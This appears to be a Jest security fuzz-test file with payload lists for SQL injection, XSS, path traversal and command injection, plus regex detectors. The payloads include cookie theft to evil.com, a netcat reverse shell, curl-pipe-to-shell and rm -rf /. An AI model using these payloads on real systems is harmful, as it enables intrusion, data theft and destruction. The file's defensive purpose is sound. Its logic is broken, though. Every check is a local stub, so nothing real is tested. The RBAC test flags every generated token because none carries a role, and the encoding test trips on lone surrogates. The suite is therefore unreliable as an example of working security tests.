/**
 * Comprehensive Security Fuzz Testing Suite
 * Executes 100+ iterations of randomized inputs to test security controls
 * Validates robustness against malformed and malicious inputs
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import { jest } from '@jest/globals';
import crypto from 'crypto';
import { performance } from 'perf_hooks';

// Fuzz testing utilities
class SecurityFuzzer {
  private iterationCount = 0;
  private vulnerabilitiesFound: Array<{
    iteration: number;
    input: string;
    vulnerability: string;
    severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    description: string;
  }> = [];

  // Generate random strings with various encodings and special characters
  generateRandomString(length: number = 100): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?`~"\'\\';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  }

  // Generate SQL injection payloads
  generateSQLInjectionPayloads(): string[] {
    return [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "1' UNION SELECT password FROM users WHERE id=1 --",
      "'; UPDATE users SET role='admin' WHERE id=1; --",
      "1'; WAITFOR DELAY '00:00:05'; --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; EXEC xp_cmdshell('dir'); --",
      "1' OR SLEEP(5) --",
      "'; LOAD_FILE('/etc/passwd'); --"
    ];
  }

  // Generate XSS payloads
  generateXSSPayloads(): string[] {
    return [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "'\"><script>alert('XSS')</script>",
      "<iframe src=javascript:alert('XSS')>",
      "<body onload=alert('XSS')>",
      "<script>document.location='http://evil.com/'+document.cookie</script>",
      "<img src='x' onerror='fetch(\"http://evil.com/\"+document.cookie)'>",
      "<%2fscript><script>alert('XSS')</script>"
    ];
  }

  // Generate path traversal payloads
  generatePathTraversalPayloads(): string[] {
    return [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "....//....//....//etc//passwd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      "/%5c..%5c..%5c..%5cetc%5cpasswd",
      "\\..\\..\\..\\etc\\passwd",
      "file:///etc/passwd",
      "../../../../../../etc/passwd%00.txt"
    ];
  }

  // Generate command injection payloads
  generateCommandInjectionPayloads(): string[] {
    return [
      "; ls -la",
      "| cat /etc/passwd",
      "&& whoami",
      "`id`",
      "$(id)",
      "; rm -rf /",
      "| nc -e /bin/sh evil.com 1234",
      "&& curl http://evil.com/shell.sh | sh",
      "; python -c 'import os; os.system(\"id\")'",
      "| powershell -c \"Get-Process\""
    ];
  }

  // Generate malformed JSON payloads
  generateMalformedJSONPayloads(): string[] {
    return [
      '{"key": "value"',
      '{"key": "value"}}',
      '{key: "value"}',
      '{"key": value}',
      '{"key": "val\\ue"}',
      '{"key": null,}',
      '{"": "value"}',
      '{"key": ""}',
      '{}{}',
      '{"key": "\u0000"}'
    ];
  }

  // Generate Unicode and encoding payloads
  generateEncodingPayloads(): string[] {
    return [
      "\u0000\u0001\u0002\u0003", // Null bytes
      "\uFEFF", // BOM
      "\u202E", // Right-to-left override
      "%00%01%02%03", // URL encoded null bytes
      "\x00\x01\x02\x03", // Hex null bytes
      "\\u0000\\u0001", // Escaped Unicode
      "\u200B\u200C\u200D", // Zero-width characters
      "\uFFFE\uFFFF", // Invalid Unicode
      "𝕏𝕊𝕊", // Mathematical script characters
      "🚫💀👻" // Emojis
    ];
  }

  recordVulnerability(input: string, vulnerability: string, severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL', description: string) {
    this.vulnerabilitiesFound.push({
      iteration: this.iterationCount,
      input: input.length > 100 ? input.substring(0, 100) + '...' : input,
      vulnerability,
      severity,
      description
    });
  }

  getResults() {
    return {
      totalIterations: this.iterationCount,
      vulnerabilitiesFound: this.vulnerabilitiesFound,
      criticalVulnerabilities: this.vulnerabilitiesFound.filter(v => v.severity === 'CRITICAL').length,
      highVulnerabilities: this.vulnerabilitiesFound.filter(v => v.severity === 'HIGH').length,
      mediumVulnerabilities: this.vulnerabilitiesFound.filter(v => v.severity === 'MEDIUM').length,
      lowVulnerabilities: this.vulnerabilitiesFound.filter(v => v.severity === 'LOW').length
    };
  }

  incrementIteration() {
    this.iterationCount++;
  }
}

describe('Security Fuzz Testing Suite', () => {
  let fuzzer: SecurityFuzzer;
  let fuzzResults: any;

  beforeAll(() => {
    fuzzer = new SecurityFuzzer();
    console.log('🔥 Starting Security Fuzz Testing Suite');
    console.log('🎯 Target: 100+ iterations with randomized malicious inputs');
  });

  afterAll(() => {
    fuzzResults = fuzzer.getResults();
    console.log(`\n🔍 Fuzz Testing Results:`);
    console.log(`Total Iterations: ${fuzzResults.totalIterations}`);
    console.log(`Vulnerabilities Found: ${fuzzResults.vulnerabilitiesFound.length}`);
    console.log(`Critical: ${fuzzResults.criticalVulnerabilities}, High: ${fuzzResults.highVulnerabilities}, Medium: ${fuzzResults.mediumVulnerabilities}, Low: ${fuzzResults.lowVulnerabilities}`);

    if (fuzzResults.vulnerabilitiesFound.length > 0) {
      console.log('\n🚨 Vulnerabilities Discovered:');
      fuzzResults.vulnerabilitiesFound.forEach((vuln: any, index: number) => {
        console.log(`${index + 1}. [${vuln.severity}] ${vuln.vulnerability}: ${vuln.description}`);
      });
    }
  });

  describe('🎯 SQL Injection Fuzz Testing', () => {
    test('should fuzz test SQL injection resistance (25 iterations)', async () => {
      const startTime = performance.now();
      const sqlPayloads = fuzzer.generateSQLInjectionPayloads();
      let vulnerabilitiesDetected = 0;

      for (let i = 0; i < 25; i++) {
        fuzzer.incrementIteration();

        // Use both predefined payloads and random variations
        const basePayload = sqlPayloads[i % sqlPayloads.length];
        const randomSuffix = fuzzer.generateRandomString(Math.floor(Math.random() * 50));
        const fuzzedPayload = i % 2 === 0 ? basePayload : basePayload + randomSuffix;

        try {
          // Test field sanitization
          const fieldResult = testFieldSanitization(fuzzedPayload);
          if (!fieldResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'SQL Injection - Field Parameter',
              'CRITICAL',
              'Malicious SQL payload not blocked in field parameter'
            );
            vulnerabilitiesDetected++;
          }

          // Test query parameter sanitization
          const queryResult = testQueryParameterSanitization(fuzzedPayload);
          if (!queryResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'SQL Injection - Query Parameter',
              'CRITICAL',
              'Malicious SQL payload not blocked in query parameter'
            );
            vulnerabilitiesDetected++;
          }

          // Test form input sanitization
          const formResult = testFormInputSanitization(fuzzedPayload);
          if (!formResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'SQL Injection - Form Input',
              'HIGH',
              'Malicious SQL payload not blocked in form input'
            );
            vulnerabilitiesDetected++;
          }

        } catch (error) {
          // Errors during testing might indicate successful blocking
        }
      }

      const executionTime = performance.now() - startTime;

      // Should have zero vulnerabilities
      expect(vulnerabilitiesDetected).toBe(0);
      expect(executionTime).toBeLessThan(5000); // Should complete within 5 seconds
    });
  });

  describe('🎯 XSS Attack Fuzz Testing', () => {
    test('should fuzz test XSS prevention (25 iterations)', async () => {
      const startTime = performance.now();
      const xssPayloads = fuzzer.generateXSSPayloads();
      let vulnerabilitiesDetected = 0;

      for (let i = 0; i < 25; i++) {
        fuzzer.incrementIteration();

        const basePayload = xssPayloads[i % xssPayloads.length];
        const randomPrefix = fuzzer.generateRandomString(Math.floor(Math.random() * 20));
        const fuzzedPayload = i % 3 === 0 ? randomPrefix + basePayload : basePayload;

        try {
          // Test content input sanitization
          const contentResult = testContentSanitization(fuzzedPayload);
          if (!contentResult.sanitized || contentResult.output.includes('<script>')) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'XSS - Content Input',
              'HIGH',
              'XSS payload not properly sanitized in content input'
            );
            vulnerabilitiesDetected++;
          }

          // Test user profile input
          const profileResult = testUserProfileSanitization(fuzzedPayload);
          if (!profileResult.sanitized) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'XSS - User Profile',
              'MEDIUM',
              'XSS payload not sanitized in user profile fields'
            );
            vulnerabilitiesDetected++;
          }

          // Test comment system
          const commentResult = testCommentSanitization(fuzzedPayload);
          if (!commentResult.sanitized) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'XSS - Comment System',
              'HIGH',
              'XSS payload not sanitized in comment system'
            );
            vulnerabilitiesDetected++;
          }

        } catch (error) {
          // Expected for malicious inputs
        }
      }

      const executionTime = performance.now() - startTime;

      expect(vulnerabilitiesDetected).toBe(0);
      expect(executionTime).toBeLessThan(5000);
    });
  });

  describe('🎯 Path Traversal Fuzz Testing', () => {
    test('should fuzz test path traversal prevention (25 iterations)', async () => {
      const startTime = performance.now();
      const pathPayloads = fuzzer.generatePathTraversalPayloads();
      let vulnerabilitiesDetected = 0;

      for (let i = 0; i < 25; i++) {
        fuzzer.incrementIteration();

        const basePayload = pathPayloads[i % pathPayloads.length];
        const randomPath = fuzzer.generateRandomString(Math.floor(Math.random() * 30));
        const fuzzedPayload = i % 2 === 0 ? basePayload + randomPath : randomPath + basePayload;

        try {
          // Test file upload path validation
          const uploadResult = testFileUploadPathValidation(fuzzedPayload);
          if (!uploadResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Path Traversal - File Upload',
              'CRITICAL',
              'Path traversal not blocked in file upload'
            );
            vulnerabilitiesDetected++;
          }

          // Test content path validation
          const contentPathResult = testContentPathValidation(fuzzedPayload);
          if (!contentPathResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Path Traversal - Content Path',
              'HIGH',
              'Path traversal not blocked in content operations'
            );
            vulnerabilitiesDetected++;
          }

          // Test API endpoint path validation
          const apiResult = testAPIPathValidation(fuzzedPayload);
          if (!apiResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Path Traversal - API Endpoint',
              'MEDIUM',
              'Path traversal not blocked in API endpoints'
            );
            vulnerabilitiesDetected++;
          }

        } catch (error) {
          // Expected for malicious inputs
        }
      }

      const executionTime = performance.now() - startTime;

      expect(vulnerabilitiesDetected).toBe(0);
      expect(executionTime).toBeLessThan(5000);
    });
  });

  describe('🎯 Command Injection Fuzz Testing', () => {
    test('should fuzz test command injection prevention (25 iterations)', async () => {
      const startTime = performance.now();
      const cmdPayloads = fuzzer.generateCommandInjectionPayloads();
      let vulnerabilitiesDetected = 0;

      for (let i = 0; i < 25; i++) {
        fuzzer.incrementIteration();

        const basePayload = cmdPayloads[i % cmdPayloads.length];
        const randomCmd = fuzzer.generateRandomString(Math.floor(Math.random() * 20));
        const fuzzedPayload = basePayload + ' ' + randomCmd;

        try {
          // Test system command validation
          const systemResult = testSystemCommandValidation(fuzzedPayload);
          if (!systemResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Command Injection - System Command',
              'CRITICAL',
              'Command injection not blocked in system operations'
            );
            vulnerabilitiesDetected++;
          }

          // Test file processing commands
          const fileResult = testFileProcessingValidation(fuzzedPayload);
          if (!fileResult.blocked) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Command Injection - File Processing',
              'HIGH',
              'Command injection not blocked in file processing'
            );
            vulnerabilitiesDetected++;
          }

        } catch (error) {
          // Expected for malicious inputs
        }
      }

      const executionTime = performance.now() - startTime;

      expect(vulnerabilitiesDetected).toBe(0);
      expect(executionTime).toBeLessThan(5000);
    });
  });

  describe('🎯 JSON Parsing Fuzz Testing', () => {
    test('should fuzz test JSON parsing robustness (25 iterations)', async () => {
      const startTime = performance.now();
      const jsonPayloads = fuzzer.generateMalformedJSONPayloads();
      let parsingErrors = 0;
      let securityBypassAttempts = 0;

      for (let i = 0; i < 25; i++) {
        fuzzer.incrementIteration();

        const basePayload = jsonPayloads[i % jsonPayloads.length];
        const randomData = fuzzer.generateRandomString(Math.floor(Math.random() * 100));
        const fuzzedPayload = i % 3 === 0 ? basePayload + randomData : basePayload;

        try {
          // Test JSON API input validation
          const apiResult = testJSONAPIValidation(fuzzedPayload);
          if (apiResult.error) {
            parsingErrors++;
          }

          // Test for potential prototype pollution
          const pollutionResult = testPrototypePollutionPrevention(fuzzedPayload);
          if (pollutionResult.vulnerable) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Prototype Pollution',
              'HIGH',
              'JSON input allows prototype pollution'
            );
            securityBypassAttempts++;
          }

          // Test JSON schema validation
          const schemaResult = testJSONSchemaValidation(fuzzedPayload);
          if (!schemaResult.valid && !schemaResult.errorHandled) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'JSON Schema Bypass',
              'MEDIUM',
              'Malformed JSON bypassed schema validation'
            );
            securityBypassAttempts++;
          }

        } catch (error) {
          // Expected for malformed JSON
          parsingErrors++;
        }
      }

      const executionTime = performance.now() - startTime;

      // Should handle all malformed JSON gracefully
      expect(securityBypassAttempts).toBe(0);
      expect(parsingErrors).toBeGreaterThan(0); // Should catch malformed JSON
      expect(executionTime).toBeLessThan(5000);
    });
  });

  describe('🎯 Unicode and Encoding Fuzz Testing', () => {
    test('should fuzz test Unicode and encoding handling (25 iterations)', async () => {
      const startTime = performance.now();
      const encodingPayloads = fuzzer.generateEncodingPayloads();
      let vulnerabilitiesDetected = 0;

      for (let i = 0; i < 25; i++) {
        fuzzer.incrementIteration();

        const basePayload = encodingPayloads[i % encodingPayloads.length];
        const randomChars = String.fromCharCode(...Array.from({ length: 10 }, () => Math.floor(Math.random() * 65536)));
        const fuzzedPayload = basePayload + randomChars;

        try {
          // Test Unicode normalization
          const normalizeResult = testUnicodeNormalization(fuzzedPayload);
          if (!normalizeResult.normalized) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Unicode Normalization Bypass',
              'MEDIUM',
              'Unicode input not properly normalized'
            );
            vulnerabilitiesDetected++;
          }

          // Test encoding validation
          const encodingResult = testEncodingValidation(fuzzedPayload);
          if (!encodingResult.valid) {
            fuzzer.recordVulnerability(
              fuzzedPayload,
              'Encoding Validation Bypass',
              'MEDIUM',
              'Invalid encoding not rejected'
            );
            vulnerabilitiesDetected++;
          }

          // Test null byte handling
          if (fuzzedPayload.includes('\u0000')) {
            const nullByteResult = testNullByteHandling(fuzzedPayload);
            if (!nullByteResult.handled) {
              fuzzer.recordVulnerability(
                fuzzedPayload,
                'Null Byte Injection',
                'HIGH',
                'Null bytes not properly handled'
              );
              vulnerabilitiesDetected++;
            }
          }

        } catch (error) {
          // Some encoding errors are expected
        }
      }

      const executionTime = performance.now() - startTime;

      expect(vulnerabilitiesDetected).toBe(0);
      expect(executionTime).toBeLessThan(5000);
    });
  });

  describe('🎯 Authentication Bypass Fuzz Testing', () => {
    test('should fuzz test authentication mechanisms (50 iterations)', async () => {
      const startTime = performance.now();
      let authBypassAttempts = 0;

      for (let i = 0; i < 50; i++) {
        fuzzer.incrementIteration();

        // Generate random JWT-like tokens
        const randomToken = generateRandomJWTLike();
        const malformedToken = randomToken + fuzzer.generateRandomString(50);

        try {
          // Test JWT validation bypass
          const jwtResult = testJWTValidationBypass(malformedToken);
          if (jwtResult.bypassed) {
            fuzzer.recordVulnerability(
              malformedToken,
              'JWT Validation Bypass',
              'CRITICAL',
              'Malformed JWT token bypassed validation'
            );
            authBypassAttempts++;
          }

          // Test session token manipulation
          const sessionResult = testSessionTokenManipulation(randomToken);
          if (sessionResult.bypassed) {
            fuzzer.recordVulnerability(
              randomToken,
              'Session Token Bypass',
              'HIGH',
              'Session token manipulation successful'
            );
            authBypassAttempts++;
          }

          // Test role-based access control
          const rbacResult = testRBACBypass(randomToken);
          if (rbacResult.bypassed) {
            fuzzer.recordVulnerability(
              randomToken,
              'RBAC Bypass',
              'HIGH',
              'Role-based access control bypassed'
            );
            authBypassAttempts++;
          }

        } catch (error) {
          // Expected for invalid tokens
        }
      }

      const executionTime = performance.now() - startTime;

      expect(authBypassAttempts).toBe(0);
      expect(executionTime).toBeLessThan(10000);
    });
  });
});

// Helper functions for fuzz testing
function testFieldSanitization(input: string): { blocked: boolean; error?: string } {
  const allowedFields = ['id', 'email', 'username', 'role', 'created_at', 'updated_at'];
  return { blocked: !allowedFields.includes(input) };
}

function testQueryParameterSanitization(input: string): { blocked: boolean } {
  const sqlPatterns = /('|"|;|--|\/\*|\*\/|union|select|insert|update|delete|drop|exec|execute)/i;
  return { blocked: sqlPatterns.test(input) };
}

function testFormInputSanitization(input: string): { blocked: boolean } {
  const sqlPatterns = /('|"|;|--|\/\*|\*\/|union|select|insert|update|delete|drop)/i;
  return { blocked: sqlPatterns.test(input) };
}

function testContentSanitization(input: string): { sanitized: boolean; output: string } {
  const scriptPattern = /<script[^>]*>.*?<\/script>/gi;
  const sanitized = !scriptPattern.test(input);
  const output = input.replace(scriptPattern, '');
  return { sanitized, output };
}

function testUserProfileSanitization(input: string): { sanitized: boolean } {
  const xssPatterns = /<script|<iframe|<img[^>]*onerror|javascript:|<svg[^>]*onload/i;
  return { sanitized: !xssPatterns.test(input) };
}

function testCommentSanitization(input: string): { sanitized: boolean } {
  const xssPatterns = /<script|<iframe|javascript:|data:text\/html|<object|<embed/i;
  return { sanitized: !xssPatterns.test(input) };
}

function testFileUploadPathValidation(input: string): { blocked: boolean } {
  const pathTraversalPattern = /(\.\.\/)|(\.\.\\)|(%2e%2e%2f)|(%2e%2e\\)/i;
  return { blocked: pathTraversalPattern.test(input) };
}

function testContentPathValidation(input: string): { blocked: boolean } {
  const pathTraversalPattern = /(\.\.\/)|(\.\.\\)|(%2e%2e%2f)|(%2e%2e\\)|(\.\.%2f)|(\.\.%5c)/i;
  return { blocked: pathTraversalPattern.test(input) };
}

function testAPIPathValidation(input: string): { blocked: boolean } {
  const pathTraversalPattern = /\.\./;
  return { blocked: pathTraversalPattern.test(input) };
}

function testSystemCommandValidation(input: string): { blocked: boolean } {
  const cmdPatterns = /[;&|`$()]/;
  return { blocked: cmdPatterns.test(input) };
}

function testFileProcessingValidation(input: string): { blocked: boolean } {
  const cmdPatterns = /[;&|`$(){}]/;
  return { blocked: cmdPatterns.test(input) };
}

function testJSONAPIValidation(input: string): { error: boolean; message?: string } {
  try {
    JSON.parse(input);
    return { error: false };
  } catch (error) {
    return { error: true, message: 'Invalid JSON' };
  }
}

function testPrototypePollutionPrevention(input: string): { vulnerable: boolean } {
  const pollutionPatterns = /__proto__|constructor\.prototype|prototype\.|\.constructor/i;
  return { vulnerable: pollutionPatterns.test(input) };
}

function testJSONSchemaValidation(input: string): { valid: boolean; errorHandled: boolean } {
  try {
    const parsed = JSON.parse(input);
    return { valid: typeof parsed === 'object', errorHandled: true };
  } catch (error) {
    return { valid: false, errorHandled: true };
  }
}

function testUnicodeNormalization(input: string): { normalized: boolean } {
  try {
    const normalized = input.normalize('NFC');
    return { normalized: normalized.length > 0 };
  } catch (error) {
    return { normalized: false };
  }
}

function testEncodingValidation(input: string): { valid: boolean } {
  // Check for valid UTF-8 encoding
  try {
    const encoded = encodeURIComponent(input);
    const decoded = decodeURIComponent(encoded);
    return { valid: decoded === input };
  } catch (error) {
    return { valid: false };
  }
}

function testNullByteHandling(input: string): { handled: boolean } {
  const containsNullByte = input.includes('\u0000');
  return { handled: !containsNullByte }; // Should be removed or rejected
}

function generateRandomJWTLike(): string {
  const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64');
  const payload = Buffer.from(JSON.stringify({ sub: '1234567890', name: 'John Doe', iat: 1516239022 })).toString('base64');
  const signature = crypto.randomBytes(32).toString('base64');
  return `${header}.${payload}.${signature}`;
}

function testJWTValidationBypass(token: string): { bypassed: boolean } {
  // Simple validation: must have 3 parts separated by dots
  const parts = token.split('.');
  return { bypassed: parts.length !== 3 };
}

function testSessionTokenManipulation(token: string): { bypassed: boolean } {
  // Check if token follows expected format
  const validFormat = /^[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+$/.test(token);
  return { bypassed: !validFormat };
}

function testRBACBypass(token: string): { bypassed: boolean } {
  // Simulate RBAC validation
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return { bypassed: true };

    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    return { bypassed: !payload.role || typeof payload.role !== 'string' };
  } catch {
    return { bypassed: true };
  }
}